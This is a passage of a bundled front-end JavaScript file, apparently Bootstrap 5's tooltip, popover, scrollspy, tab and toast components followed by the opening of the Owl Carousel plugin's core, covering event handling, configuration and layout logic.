              (this._hideModalHandler = function () {
                t._element && t.hide();
              }),
              z.on(
                this._element.closest(".modal"),
                "hide.bs.modal",
                this._hideModalHandler
              ),
              this.config.selector
                ? (this.config = n({}, this.config, {
                    trigger: "manual",
                    selector: "",
                  }))
                : this._fixTitle();
          }),
          (r._fixTitle = function () {
            var t = this._element.getAttribute("title"),
              e = typeof this._element.getAttribute("data-bs-original-title");
            (t || "string" !== e) &&
              (this._element.setAttribute("data-bs-original-title", t || ""),
              !t ||
                this._element.getAttribute("aria-label") ||
                this._element.textContent ||
                this._element.setAttribute("aria-label", t),
              this._element.setAttribute("title", ""));
          }),
          (r._enter = function (t, e) {
            (e = this._initializeOnDelegatedTarget(t, e)),
              t &&
                (e._activeTrigger["focusin" === t.type ? "focus" : "hover"] =
                  !0),
              e.getTipElement().classList.contains("show") ||
              "show" === e._hoverState
                ? (e._hoverState = "show")
                : (clearTimeout(e._timeout),
                  (e._hoverState = "show"),
                  e.config.delay && e.config.delay.show
                    ? (e._timeout = setTimeout(function () {
                        "show" === e._hoverState && e.show();
                      }, e.config.delay.show))
                    : e.show());
          }),
          (r._leave = function (t, e) {
            (e = this._initializeOnDelegatedTarget(t, e)),
              t &&
                (e._activeTrigger["focusout" === t.type ? "focus" : "hover"] =
                  !1),
              e._isWithActiveTrigger() ||
                (clearTimeout(e._timeout),
                (e._hoverState = "out"),
                e.config.delay && e.config.delay.hide
                  ? (e._timeout = setTimeout(function () {
                      "out" === e._hoverState && e.hide();
                    }, e.config.delay.hide))
                  : e.hide());
          }),
          (r._isWithActiveTrigger = function () {
            for (var t in this._activeTrigger)
              if (this._activeTrigger[t]) return !0;
            return !1;
          }),
          (r._getConfig = function (t) {
            var e = q.getDataAttributes(this._element);
            return (
              Object.keys(e).forEach(function (t) {
                Ce.has(t) && delete e[t];
              }),
              t &&
                "object" == typeof t.container &&
                t.container.jquery &&
                (t.container = t.container[0]),
              "number" ==
                typeof (t = n(
                  {},
                  this.constructor.Default,
                  e,
                  "object" == typeof t && t ? t : {}
                )).delay && (t.delay = { show: t.delay, hide: t.delay }),
              "number" == typeof t.title && (t.title = t.title.toString()),
              "number" == typeof t.content &&
                (t.content = t.content.toString()),
              p("tooltip", t, this.constructor.DefaultType),
              t.sanitize &&
                (t.template = Ee(t.template, t.allowList, t.sanitizeFn)),
              t
            );
          }),
          (r._getDelegateConfig = function () {
            var t = {};
            if (this.config)
              for (var e in this.config)
                this.constructor.Default[e] !== this.config[e] &&
                  (t[e] = this.config[e]);
            return t;
          }),
          (r._cleanTipClass = function () {
            var t = this.getTipElement(),
              e = t.getAttribute("class").match(Te);
            null !== e &&
              e.length > 0 &&
              e
                .map(function (t) {
                  return t.trim();
                })
                .forEach(function (e) {
                  return t.classList.remove(e);
                });
          }),
          (r._handlePopperPlacementChange = function (t) {
            var e = t.state;
            e &&
              ((this.tip = e.elements.popper),
              this._cleanTipClass(),
              this._addAttachmentClass(this._getAttachment(e.placement)));
          }),
          (o.jQueryInterface = function (t) {
            return this.each(function () {
              var e = E(this, "bs.tooltip"),
                n = "object" == typeof t && t;
              if (
                (e || !/dispose|hide/.test(t)) &&
                (e || (e = new o(this, n)), "string" == typeof t)
              ) {
                if (void 0 === e[t])
                  throw new TypeError('No method named "' + t + '"');
                e[t]();
              }
            });
          }),
          e(o, null, [
            {
              key: "Default",
              get: function () {
                return Se;
              },
            },
            {
              key: "NAME",
              get: function () {
                return "tooltip";
              },
            },
            {
              key: "DATA_KEY",
              get: function () {
                return "bs.tooltip";
              },
            },
            {
              key: "Event",
              get: function () {
                return Le;
              },
            },
            {
              key: "EVENT_KEY",
              get: function () {
                return ".bs.tooltip";
              },
            },
            {
              key: "DefaultType",
              get: function () {
                return Ae;
              },
            },
          ]),
          o
        );
      })(B);
    _("tooltip", De);
    var Ne = new RegExp("(^|\\s)bs-popover\\S+", "g"),
      Oe = n({}, De.Default, {
        placement: "right",
        offset: [0, 8],
        trigger: "click",
        content: "",
        template:
          '<div class="popover" role="tooltip"><div class="popover-arrow"></div><h3 class="popover-header"></h3><div class="popover-body"></div></div>',
      }),
      je = n({}, De.DefaultType, { content: "(string|element|function)" }),
      Pe = {
        HIDE: "hide.bs.popover",
        HIDDEN: "hidden.bs.popover",
        SHOW: "show.bs.popover",
        SHOWN: "shown.bs.popover",
        INSERTED: "inserted.bs.popover",
        CLICK: "click.bs.popover",
        FOCUSIN: "focusin.bs.popover",
        FOCUSOUT: "focusout.bs.popover",
        MOUSEENTER: "mouseenter.bs.popover",
        MOUSELEAVE: "mouseleave.bs.popover",
      },
      He = (function (t) {
        function n() {
          return t.apply(this, arguments) || this;
        }
        i(n, t);
        var o = n.prototype;
        return (
          (o.isWithContent = function () {
            return this.getTitle() || this._getContent();
          }),
          (o.setContent = function () {
            var t = this.getTipElement();
            this.setElementContent(U(".popover-header", t), this.getTitle());
            var e = this._getContent();
            "function" == typeof e && (e = e.call(this._element)),
              this.setElementContent(U(".popover-body", t), e),
              t.classList.remove("fade", "show");
          }),
          (o._addAttachmentClass = function (t) {
            this.getTipElement().classList.add(
              "bs-popover-" + this.updateAttachment(t)
            );
          }),
          (o._getContent = function () {
            return (
              this._element.getAttribute("data-bs-content") ||
              this.config.content
            );
          }),
          (o._cleanTipClass = function () {
            var t = this.getTipElement(),
              e = t.getAttribute("class").match(Ne);
            null !== e &&
              e.length > 0 &&
              e
                .map(function (t) {
                  return t.trim();
                })
                .forEach(function (e) {
                  return t.classList.remove(e);
                });
          }),
          (n.jQueryInterface = function (t) {
            return this.each(function () {
              var e = E(this, "bs.popover"),
                i = "object" == typeof t ? t : null;
              if (
                (e || !/dispose|hide/.test(t)) &&
                (e || ((e = new n(this, i)), x(this, "bs.popover", e)),
                "string" == typeof t)
              ) {
                if (void 0 === e[t])
                  throw new TypeError('No method named "' + t + '"');
                e[t]();
              }
            });
          }),
          e(n, null, [
            {
              key: "Default",
              get: function () {
                return Oe;
              },
            },
            {
              key: "NAME",
              get: function () {
                return "popover";
              },
            },
            {
              key: "DATA_KEY",
              get: function () {
                return "bs.popover";
              },
            },
            {
              key: "Event",
              get: function () {
                return Pe;
              },
            },
            {
              key: "EVENT_KEY",
              get: function () {
                return ".bs.popover";
              },
            },
            {
              key: "DefaultType",
              get: function () {
                return je;
              },
            },
          ]),
          n
        );
      })(De);
    _("popover", He);
    var Me = { offset: 10, method: "auto", target: "" },
      ze = { offset: "number", method: "string", target: "(string|element)" },
      Be = (function (t) {
        function o(e, n) {
          var i;
          return (
            ((i = t.call(this, e) || this)._scrollElement =
              "BODY" === e.tagName ? window : e),
            (i._config = i._getConfig(n)),
            (i._selector =
              i._config.target +
              " .nav-link, " +
              i._config.target +
              " .list-group-item, " +
              i._config.target +
              " .dropdown-item"),
            (i._offsets = []),
            (i._targets = []),
            (i._activeTarget = null),
            (i._scrollHeight = 0),
            z.on(i._scrollElement, "scroll.bs.scrollspy", function () {
              return i._process();
            }),
            i.refresh(),
            i._process(),
            i
          );
        }
        i(o, t);
        var r = o.prototype;
        return (
          (r.refresh = function () {
            var t = this,
              e =
                this._scrollElement === this._scrollElement.window
                  ? "offset"
                  : "position",
              n = "auto" === this._config.method ? e : this._config.method,
              i = "position" === n ? this._getScrollTop() : 0;
            (this._offsets = []),
              (this._targets = []),
              (this._scrollHeight = this._getScrollHeight()),
              F(this._selector)
                .map(function (t) {
                  var e = l(t),
                    o = e ? U(e) : null;
                  if (o) {
                    var r = o.getBoundingClientRect();
                    if (r.width || r.height) return [q[n](o).top + i, e];
                  }
                  return null;
                })
                .filter(function (t) {
                  return t;
                })
                .sort(function (t, e) {
                  return t[0] - e[0];
                })
                .forEach(function (e) {
                  t._offsets.push(e[0]), t._targets.push(e[1]);
                });
          }),
          (r.dispose = function () {
            t.prototype.dispose.call(this),
              z.off(this._scrollElement, ".bs.scrollspy"),
              (this._scrollElement = null),
              (this._config = null),
              (this._selector = null),
              (this._offsets = null),
              (this._targets = null),
              (this._activeTarget = null),
              (this._scrollHeight = null);
          }),
          (r._getConfig = function (t) {
            if (
              "string" !=
                typeof (t = n({}, Me, "object" == typeof t && t ? t : {}))
                  .target &&
              h(t.target)
            ) {
              var e = t.target.id;
              e || ((e = s("scrollspy")), (t.target.id = e)),
                (t.target = "#" + e);
            }
            return p("scrollspy", t, ze), t;
          }),
          (r._getScrollTop = function () {
            return this._scrollElement === window
              ? this._scrollElement.pageYOffset
              : this._scrollElement.scrollTop;
          }),
          (r._getScrollHeight = function () {
            return (
              this._scrollElement.scrollHeight ||
              Math.max(
                document.body.scrollHeight,
                document.documentElement.scrollHeight
              )
            );
          }),
          (r._getOffsetHeight = function () {
            return this._scrollElement === window
              ? window.innerHeight
              : this._scrollElement.getBoundingClientRect().height;
          }),
          (r._process = function () {
            var t = this._getScrollTop() + this._config.offset,
              e = this._getScrollHeight(),
              n = this._config.offset + e - this._getOffsetHeight();
            if ((this._scrollHeight !== e && this.refresh(), t >= n)) {
              var i = this._targets[this._targets.length - 1];
              this._activeTarget !== i && this._activate(i);
            } else {
              if (
                this._activeTarget &&
                t < this._offsets[0] &&
                this._offsets[0] > 0
              )
                return (this._activeTarget = null), void this._clear();
              for (var o = this._offsets.length; o--; )
                this._activeTarget !== this._targets[o] &&
                  t >= this._offsets[o] &&
                  (void 0 === this._offsets[o + 1] ||
                    t < this._offsets[o + 1]) &&
                  this._activate(this._targets[o]);
            }
          }),
          (r._activate = function (t) {
            (this._activeTarget = t), this._clear();
            var e = this._selector.split(",").map(function (e) {
                return (
                  e + '[data-bs-target="' + t + '"],' + e + '[href="' + t + '"]'
                );
              }),
              n = U(e.join(","));
            n.classList.contains("dropdown-item")
              ? (U(".dropdown-toggle", n.closest(".dropdown")).classList.add(
                  "active"
                ),
                n.classList.add("active"))
              : (n.classList.add("active"),
                (function (t, e) {
                  for (
                    var n = [], i = t.parentNode;
                    i && i.nodeType === Node.ELEMENT_NODE && 3 !== i.nodeType;

                  )
                    i.matches(".nav, .list-group") && n.push(i),
                      (i = i.parentNode);
                  return n;
                })(n).forEach(function (t) {
                  V(t, ".nav-link, .list-group-item").forEach(function (t) {
                    return t.classList.add("active");
                  }),
                    V(t, ".nav-item").forEach(function (t) {
                      X(t, ".nav-link").forEach(function (t) {
                        return t.classList.add("active");
                      });
                    });
                })),
              z.trigger(this._scrollElement, "activate.bs.scrollspy", {
                relatedTarget: t,
              });
          }),
          (r._clear = function () {
            F(this._selector)
              .filter(function (t) {
                return t.classList.contains("active");
              })
              .forEach(function (t) {
                return t.classList.remove("active");
              });
          }),
          (o.jQueryInterface = function (t) {
            return this.each(function () {
              var e = E(this, "bs.scrollspy");
              if (
                (e || (e = new o(this, "object" == typeof t && t)),
                "string" == typeof t)
              ) {
                if (void 0 === e[t])
                  throw new TypeError('No method named "' + t + '"');
                e[t]();
              }
            });
          }),
          e(o, null, [
            {
              key: "Default",
              get: function () {
                return Me;
              },
            },
            {
              key: "DATA_KEY",
              get: function () {
                return "bs.scrollspy";
              },
            },
          ]),
          o
        );
      })(B);
    z.on(window, "load.bs.scrollspy.data-api", function () {
      F('[data-bs-spy="scroll"]').forEach(function (t) {
        return new Be(t, q.getDataAttributes(t));
      });
    }),
      _("scrollspy", Be);
    var Ie = (function (t) {
      function n() {
        return t.apply(this, arguments) || this;
      }
      i(n, t);
      var o = n.prototype;
      return (
        (o.show = function () {
          var t = this;
          if (
            !(
              (this._element.parentNode &&
                this._element.parentNode.nodeType === Node.ELEMENT_NODE &&
                this._element.classList.contains("active")) ||
              this._element.classList.contains("disabled")
            )
          ) {
            var e,
              n = c(this._element),
              i = this._element.closest(".nav, .list-group");
            if (i) {
              var o =
                "UL" === i.nodeName || "OL" === i.nodeName
                  ? ":scope > li > .active"
                  : ".active";
              e = (e = F(o, i))[e.length - 1];
            }
            var r = e
              ? z.trigger(e, "hide.bs.tab", { relatedTarget: this._element })
              : null;
            if (
              !(
                z.trigger(this._element, "show.bs.tab", { relatedTarget: e })
                  .defaultPrevented ||
                (null !== r && r.defaultPrevented)
              )
            ) {
              this._activate(this._element, i);
              var s = function () {
                z.trigger(e, "hidden.bs.tab", { relatedTarget: t._element }),
                  z.trigger(t._element, "shown.bs.tab", { relatedTarget: e });
              };
              n ? this._activate(n, n.parentNode, s) : s();
            }
          }
        }),
        (o._activate = function (t, e, n) {
          var i = this,
            o = (
              !e || ("UL" !== e.nodeName && "OL" !== e.nodeName)
                ? X(e, ".active")
                : F(":scope > li > .active", e)
            )[0],
            r = n && o && o.classList.contains("fade"),
            s = function () {
              return i._transitionComplete(t, o, n);
            };
          if (o && r) {
            var a = u(o);
            o.classList.remove("show"), z.one(o, "transitionend", s), f(o, a);
          } else s();
        }),
        (o._transitionComplete = function (t, e, n) {
          if (e) {
            e.classList.remove("active");
            var i = U(":scope > .dropdown-menu .active", e.parentNode);
            i && i.classList.remove("active"),
              "tab" === e.getAttribute("role") &&
                e.setAttribute("aria-selected", !1);
          }
          t.classList.add("active"),
            "tab" === t.getAttribute("role") &&
              t.setAttribute("aria-selected", !0),
            v(t),
            t.classList.contains("fade") && t.classList.add("show"),
            t.parentNode &&
              t.parentNode.classList.contains("dropdown-menu") &&
              (t.closest(".dropdown") &&
                F(".dropdown-toggle").forEach(function (t) {
                  return t.classList.add("active");
                }),
              t.setAttribute("aria-expanded", !0)),
            n && n();
        }),
        (n.jQueryInterface = function (t) {
          return this.each(function () {
            var e = E(this, "bs.tab") || new n(this);
            if ("string" == typeof t) {
              if (void 0 === e[t])
                throw new TypeError('No method named "' + t + '"');
              e[t]();
            }
          });
        }),
        e(n, null, [
          {
            key: "DATA_KEY",
            get: function () {
              return "bs.tab";
            },
          },
        ]),
        n
      );
    })(B);
    z.on(
      document,
      "click.bs.tab.data-api",
      '[data-bs-toggle="tab"], [data-bs-toggle="pill"], [data-bs-toggle="list"]',
      function (t) {
        t.preventDefault(), (E(this, "bs.tab") || new Ie(this)).show();
      }
    ),
      _("tab", Ie);
    var $e = { animation: "boolean", autohide: "boolean", delay: "number" },
      Re = { animation: !0, autohide: !0, delay: 5e3 },
      We = (function (t) {
        function o(e, n) {
          var i;
          return (
            ((i = t.call(this, e) || this)._config = i._getConfig(n)),
            (i._timeout = null),
            i._setListeners(),
            i
          );
        }
        i(o, t);
        var r = o.prototype;
        return (
          (r.show = function () {
            var t = this;
            if (!z.trigger(this._element, "show.bs.toast").defaultPrevented) {
              this._clearTimeout(),
                this._config.animation && this._element.classList.add("fade");
              var e = function () {
                t._element.classList.remove("showing"),
                  t._element.classList.add("show"),
                  z.trigger(t._element, "shown.bs.toast"),
                  t._config.autohide &&
                    (t._timeout = setTimeout(function () {
                      t.hide();
                    }, t._config.delay));
              };
              if (
                (this._element.classList.remove("hide"),
                v(this._element),
                this._element.classList.add("showing"),
                this._config.animation)
              ) {
                var n = u(this._element);
                z.one(this._element, "transitionend", e), f(this._element, n);
              } else e();
            }
          }),
          (r.hide = function () {
            var t = this;
            if (
              this._element.classList.contains("show") &&
              !z.trigger(this._element, "hide.bs.toast").defaultPrevented
            ) {
              var e = function () {
                t._element.classList.add("hide"),
                  z.trigger(t._element, "hidden.bs.toast");
              };
              if (
                (this._element.classList.remove("show"), this._config.animation)
              ) {
                var n = u(this._element);
                z.one(this._element, "transitionend", e), f(this._element, n);
              } else e();
            }
          }),
          (r.dispose = function () {
            this._clearTimeout(),
              this._element.classList.contains("show") &&
                this._element.classList.remove("show"),
              z.off(this._element, "click.dismiss.bs.toast"),
              t.prototype.dispose.call(this),
              (this._config = null);
          }),
          (r._getConfig = function (t) {
            return (
              (t = n(
                {},
                Re,
                q.getDataAttributes(this._element),
                "object" == typeof t && t ? t : {}
              )),
              p("toast", t, this.constructor.DefaultType),
              t
            );
          }),
          (r._setListeners = function () {
            var t = this;
            z.on(
              this._element,
              "click.dismiss.bs.toast",
              '[data-bs-dismiss="toast"]',
              function () {
                return t.hide();
              }
            );
          }),
          (r._clearTimeout = function () {
            clearTimeout(this._timeout), (this._timeout = null);
          }),
          (o.jQueryInterface = function (t) {
            return this.each(function () {
              var e = E(this, "bs.toast");
              if (
                (e || (e = new o(this, "object" == typeof t && t)),
                "string" == typeof t)
              ) {
                if (void 0 === e[t])
                  throw new TypeError('No method named "' + t + '"');
                e[t](this);
              }
            });
          }),
          e(o, null, [
            {
              key: "DefaultType",
              get: function () {
                return $e;
              },
            },
            {
              key: "Default",
              get: function () {
                return Re;
              },
            },
            {
              key: "DATA_KEY",
              get: function () {
                return "bs.toast";
              },
            },
          ]),
          o
        );
      })(B);
    return (
      _("toast", We),
      {
        Alert: I,
        Button: $,
        Carousel: Q,
        Collapse: J,
        Dropdown: me,
        Modal: be,
        Popover: He,
        ScrollSpy: Be,
        Tab: Ie,
        Toast: We,
        Tooltip: De,
      }
    );
  }),
  (function (t, e, n, i) {
    function o(e, n) {
      (this.settings = null),
        (this.options = t.extend({}, o.Defaults, n)),
        (this.$element = t(e)),
        (this._handlers = {}),
        (this._plugins = {}),
        (this._supress = {}),
        (this._current = null),
        (this._speed = null),
        (this._coordinates = []),
        (this._breakpoint = null),
        (this._width = null),
        (this._items = []),
        (this._clones = []),
        (this._mergers = []),
        (this._widths = []),
        (this._invalidated = {}),
        (this._pipe = []),
        (this._drag = {
          time: null,
          target: null,
          pointer: null,
          stage: { start: null, current: null },
          direction: null,
        }),
        (this._states = {
          current: {},
          tags: {
            initializing: ["busy"],
            animating: ["busy"],
            dragging: ["interacting"],
          },
        }),
        t.each(
          ["onResize", "onThrottledResize"],
          t.proxy(function (e, n) {
            this._handlers[n] = t.proxy(this[n], this);
          }, this)
        ),
        t.each(
          o.Plugins,
          t.proxy(function (t, e) {
            this._plugins[t.charAt(0).toLowerCase() + t.slice(1)] = new e(this);
          }, this)
        ),
        t.each(
          o.Workers,
          t.proxy(function (e, n) {
            this._pipe.push({ filter: n.filter, run: t.proxy(n.run, this) });
          }, this)
        ),
        this.setup(),
        this.initialize();
    }
    (o.Defaults = {
      items: 3,
      loop: !1,
      center: !1,
      rewind: !1,
      checkVisibility: !0,
      mouseDrag: !0,
      touchDrag: !0,
      pullDrag: !0,
      freeDrag: !1,
      margin: 0,
      stagePadding: 0,
      merge: !1,
      mergeFit: !0,
      autoWidth: !1,
      startPosition: 0,
      rtl: !1,
      smartSpeed: 250,
      fluidSpeed: !1,
      dragEndSpeed: !1,
      responsive: {},
      responsiveRefreshRate: 200,
      responsiveBaseElement: e,
      fallbackEasing: "swing",
      slideTransition: "",
      info: !1,
      nestedItemSelector: !1,
      itemElement: "div",
      stageElement: "div",
      refreshClass: "owl-refresh",
      loadedClass: "owl-loaded",
      loadingClass: "owl-loading",
      rtlClass: "owl-rtl",
      responsiveClass: "owl-responsive",
      dragClass: "owl-drag",
      itemClass: "owl-item",
      stageClass: "owl-stage",
      stageOuterClass: "owl-stage-outer",
      grabClass: "owl-grab",
    }),
      (o.Width = { Default: "default", Inner: "inner", Outer: "outer" }),
      (o.Type = { Event: "event", State: "state" }),
      (o.Plugins = {}),
      (o.Workers = [
        {
          filter: ["width", "settings"],
          run: function () {
            this._width = this.$element.width();
          },
        },
        {
          filter: ["width", "items", "settings"],
          run: function (t) {
            t.current =
              this._items && this._items[this.relative(this._current)];
          },
        },
        {
          filter: ["items", "settings"],
          run: function () {
            this.$stage.children(".cloned").remove();
          },
        },
        {
          filter: ["width", "items", "settings"],
          run: function (t) {
            var e = this.settings.margin || "",
              n = !this.settings.autoWidth,
              i = this.settings.rtl,
              o = {
                width: "auto",
                "margin-left": i ? e : "",
                "margin-right": i ? "" : e,
              };
            !n && this.$stage.children().css(o), (t.css = o);
          },
        },
        {
          filter: ["width", "items", "settings"],
          run: function (t) {
            var e =
                (this.width() / this.settings.items).toFixed(3) -
                this.settings.margin,
              n = null,
              i = this._items.length,
              o = !this.settings.autoWidth,
              r = [];
            for (t.items = { merge: !1, width: e }; i--; )
              (n = this._mergers[i]),
                (n =
                  (this.settings.mergeFit &&
                    Math.min(n, this.settings.items)) ||
                  n),
                (t.items.merge = n > 1 || t.items.merge),
                (r[i] = o ? e * n : this._items[i].width());
            this._widths = r;
          },
        },
        {
          filter: ["items", "settings"],
          run: function () {
            var e = [],
              n = this._items,
              i = this.settings,
              o = Math.max(2 * i.items, 4),
              r = 2 * Math.ceil(n.length / 2),
              s = i.loop && n.length ? (i.rewind ? o : Math.max(o, r)) : 0,
              a = "",
              l = "";
            for (s /= 2; s > 0; )
              e.push(this.normalize(e.length / 2, !0)),
                (a += n[e[e.length - 1]][0].outerHTML),
                e.push(this.normalize(n.length - 1 - (e.length - 1) / 2, !0)),
                (l = n[e[e.length - 1]][0].outerHTML + l),
                (s -= 1);
            (this._clones = e),
              t(a).addClass("cloned").appendTo(this.$stage),
              t(l).addClass("cloned").prependTo(this.$stage);
          },
        },
        {
          filter: ["width", "items", "settings"],
          run: function () {
            for (
              var t = this.settings.rtl ? 1 : -1,
                e = this._clones.length + this._items.length,
                n = -1,
                i = 0,
                o = 0,
                r = [];
              ++n < e;

            )
              (i = r[n - 1] || 0),
                (o = this._widths[this.relative(n)] + this.settings.margin),
                r.push(i + o * t);
            this._coordinates = r;
          },
        },
        {
          filter: ["width", "items", "settings"],
          run: function () {
            var t = this.settings.stagePadding,
              e = this._coordinates,
              n = {
                width: Math.ceil(Math.abs(e[e.length - 1])) + 2 * t,
                "padding-left": t || "",
                "padding-right": t || "",
              };
            this.$stage.css(n);
          },
        },
        {
          filter: ["width", "items", "settings"],
          run: function (t) {
            var e = this._coordinates.length,
              n = !this.settings.autoWidth,
              i = this.$stage.children();
            if (n && t.items.merge)
              for (; e--; )
                (t.css.width = this._widths[this.relative(e)]),
                  i.eq(e).css(t.css);
            else n && ((t.css.width = t.items.width), i.css(t.css));
          },
        },
        {
          filter: ["items"],
          run: function () {
            this._coordinates.length < 1 && this.$stage.removeAttr("style");
          },
        },
        {
          filter: ["width", "items", "settings"],
          run: function (t) {
            (t.current = t.current
              ? this.$stage.children().index(t.current)
              : 0),
              (t.current = Math.max(
                this.minimum(),
                Math.min(this.maximum(), t.current)
              )),
              this.reset(t.current);
          },
        },
        {
          filter: ["position"],
          run: function () {
            this.animate(this.coordinates(this._current));
          },
        },
        {
          filter: ["width", "position", "items", "settings"],
          run: function () {
            var t,
              e,
              n,
              i,
              o = this.settings.rtl ? 1 : -1,
              r = 2 * this.settings.stagePadding,
              s = this.coordinates(this.current()) + r,
              a = s + this.width() * o,
              l = [];
            for (n = 0, i = this._coordinates.length; n < i; n++)
              (t = this._coordinates[n - 1] || 0),
                (e = Math.abs(this._coordinates[n]) + r * o),
                ((this.op(t, "<=", s) && this.op(t, ">", a)) ||
                  (this.op(e, "<", s) && this.op(e, ">", a))) &&
                  l.push(n);
            this.$stage.children(".active").removeClass("active"),
              this.$stage
                .children(":eq(" + l.join("), :eq(") + ")")
                .addClass("active"),
              this.$stage.children(".center").removeClass("center"),
              this.settings.center &&
                this.$stage.children().eq(this.current()).addClass("center");
          },
        },
      ]),
      (o.prototype.initializeStage = function () {
        (this.$stage = this.$element.find("." + this.settings.stageClass)),
          this.$stage.length ||
            (this.$element.addClass(this.options.loadingClass),
            (this.$stage = t("<" + this.settings.stageElement + ">", {
              class: this.settings.stageClass,
            }).wrap(t("<div/>", { class: this.settings.stageOuterClass }))),
            this.$element.append(this.$stage.parent()));
      }),
      (o.prototype.initializeItems = function () {
        var e = this.$element.find(".owl-item");
        if (e.length)
          return (
            (this._items = e.get().map(function (e) {
              return t(e);
            })),
            (this._mergers = this._items.map(function () {
              return 1;
            })),
            void this.refresh()
          );
        this.replace(this.$element.children().not(this.$stage.parent())),
          this.isVisible() ? this.refresh() : this.invalidate("width"),
          this.$element
            .removeClass(this.options.loadingClass)
            .addClass(this.options.loadedClass);
      }),
      (o.prototype.initialize = function () {
        var t, e, n;
        (this.enter("initializing"),
        this.trigger("initialize"),
        this.$element.toggleClass(this.settings.rtlClass, this.settings.rtl),
        this.settings.autoWidth && !this.is("pre-loading")) &&
          ((t = this.$element.find("img")),
          (e = this.settings.nestedItemSelector
            ? "." + this.settings.nestedItemSelector
            : i),
          (n = this.$element.children(e).width()),
          t.length && n <= 0 && this.preloadAutoWidthImages(t));
        this.initializeStage(),
          this.initializeItems(),
          this.registerEventHandlers(),
          this.leave("initializing"),
          this.trigger("initialized");
      }),
      (o.prototype.isVisible = function () {
        return !this.settings.checkVisibility || this.$element.is(":visible");
      }),
      (o.prototype.setup = function () {
        var e = this.viewport(),
          n = this.options.responsive,
          i = -1,
          o = null;
        n
          ? (t.each(n, function (t) {
              t <= e && t > i && (i = Number(t));
            }),
            "function" ==
              typeof (o = t.extend({}, this.options, n[i])).stagePadding &&
              (o.stagePadding = o.stagePadding()),
            delete o.responsive,
            o.responsiveClass &&
              this.$element.attr(
                "class",
                this.$element
                  .attr("class")
                  .replace(
                    new RegExp(
                      "(" + this.options.responsiveClass + "-)\\S+\\s",
                      "g"
                    ),
                    "$1" + i
                  )
              ))
          : (o = t.extend({}, this.options)),
          this.trigger("change", { property: { name: "settings", value: o } }),
          (this._breakpoint = i),
          (this.settings = o),
          this.invalidate("settings"),
          this.trigger("changed", {
            property: { name: "settings", value: this.settings },
          });
      }),
      (o.prototype.optionsLogic = function () {
        this.settings.autoWidth &&
          ((this.settings.stagePadding = !1), (this.settings.merge = !1));
      }),
      (o.prototype.prepare = function (e) {
        var n = this.trigger("prepare", { content: e });
        return (
          n.data ||
            (n.data = t("<" + this.settings.itemElement + "/>")
              .addClass(this.options.itemClass)
              .append(e)),
          this.trigger("prepared", { content: n.data }),
          n.data
        );
      }),
      (o.prototype.update = function () {
        for (
          var e = 0,
            n = this._pipe.length,
            i = t.proxy(function (t) {
              return this[t];
            }, this._invalidated),
            o = {};
          e < n;

        )
          (this._invalidated.all ||
            t.grep(this._pipe[e].filter, i).length > 0) &&
            this._pipe[e].run(o),
            e++;
        (this._invalidated = {}), !this.is("valid") && this.enter("valid");
      }),
      (o.prototype.width = function (t) {
        switch ((t = t || o.Width.Default)) {
          case o.Width.Inner:
          case o.Width.Outer:
            return this._width;
          default:
            return (
              this._width -
              2 * this.settings.stagePadding +
              this.settings.margin
            );
        }
      }),
      (o.prototype.refresh = function () {
        this.enter("refreshing"),
          this.trigger("refresh"),
          this.setup(),
          this.optionsLogic(),
          this.$element.addClass(this.options.refreshClass),
          this.update(),
          this.$element.removeClass(this.options.refreshClass),
          this.leave("refreshing"),
          this.trigger("refreshed");
      }),
      (o.prototype.onThrottledResize = function () {
        e.clearTimeout(this.resizeTimer),
          (this.resizeTimer = e.setTimeout(
            this._handlers.onResize,
            this.settings.responsiveRefreshRate
          ));
      }),
      (o.prototype.onResize = function () {
        return (
          !!this._items.length &&
          this._width !== this.$element.width() &&
          !!this.isVisible() &&
          (this.enter("resizing"),
          this.trigger("resize").isDefaultPrevented()
            ? (this.leave("resizing"), !1)
            : (this.invalidate("width"),
              this.refresh(),
              this.leave("resizing"),
              void this.trigger("resized")))
        );
      }),
      (o.prototype.registerEventHandlers = function () {
        t.support.transition &&
          this.$stage.on(
            t.support.transition.end + ".owl.core",
            t.proxy(this.onTransitionEnd, this)
          ),
          !1 !== this.settings.responsive &&
            this.on(e, "resize", this._handlers.onThrottledResize),
          this.settings.mouseDrag &&
            (this.$element.addClass(this.options.dragClass),
            this.$stage.on(
              "mousedown.owl.core",
              t.proxy(this.onDragStart, this)
            ),
            this.$stage.on(
              "dragstart.owl.core selectstart.owl.core",
              function () {
                return !1;
              }
            )),
          this.settings.touchDrag &&
            (this.$stage.on(
              "touchstart.owl.core",
              t.proxy(this.onDragStart, this)
            ),
            this.$stage.on(
              "touchcancel.owl.core",
              t.proxy(this.onDragEnd, this)
            ));
      }),
      (o.prototype.onDragStart = function (e) {
        var i = null;
        3 !== e.which &&
          (t.support.transform
            ? (i = {
                x: (i = this.$stage
                  .css("transform")
                  .replace(/.*\(|\)| /g, "")
                  .split(","))[16 === i.length ? 12 : 4],
                y: i[16 === i.length ? 13 : 5],
              })
            : ((i = this.$stage.position()),
              (i = {
                x: this.settings.rtl
                  ? i.left +
                    this.$stage.width() -
                    this.width() +
                    this.settings.margin
                  : i.left,
                y: i.top,
              })),
          this.is("animating") &&
            (t.support.transform ? this.animate(i.x) : this.$stage.stop(),
            this.invalidate("position")),
          this.$element.toggleClass(
            this.options.grabClass,
            "mousedown" === e.type
          ),
          this.speed(0),
          (this._drag.time = new Date().getTime()),
          (this._drag.target = t(e.target)),
          (this._drag.stage.start = i),
          (this._drag.stage.current = i),
          (this._drag.pointer = this.pointer(e)),
          t(n).on(
            "mouseup.owl.core touchend.owl.core",
            t.proxy(this.onDragEnd, this)
          ),
          t(n).one(
            "mousemove.owl.core touchmove.owl.core",
            t.proxy(function (e) {
              var i = this.difference(this._drag.pointer, this.pointer(e));
              t(n).on(
                "mousemove.owl.core touchmove.owl.core",
                t.proxy(this.onDragMove, this)
              ),
                (Math.abs(i.x) < Math.abs(i.y) && this.is("valid")) ||
                  (e.preventDefault(),
                  this.enter("dragging"),
                  this.trigger("drag"));
            }, this)
          ));
      }),
      (o.prototype.onDragMove = function (t) {
        var e = null,
          n = null,
          i = null,
          o = this.difference(this._drag.pointer, this.pointer(t)),
          r = this.difference(this._drag.stage.start, o);
        this.is("dragging") &&
          (t.preventDefault(),
          this.settings.loop
            ? ((e = this.coordinates(this.minimum())),
              (n = this.coordinates(this.maximum() + 1) - e),
              (r.x = ((((r.x - e) % n) + n) % n) + e))
            : ((e = this.settings.rtl
                ? this.coordinates(this.maximum())
                : this.coordinates(this.minimum())),
              (n = this.settings.rtl
                ? this.coordinates(this.minimum())
                : this.coordinates(this.maximum())),
              (i = this.settings.pullDrag ? (-1 * o.x) / 5 : 0),
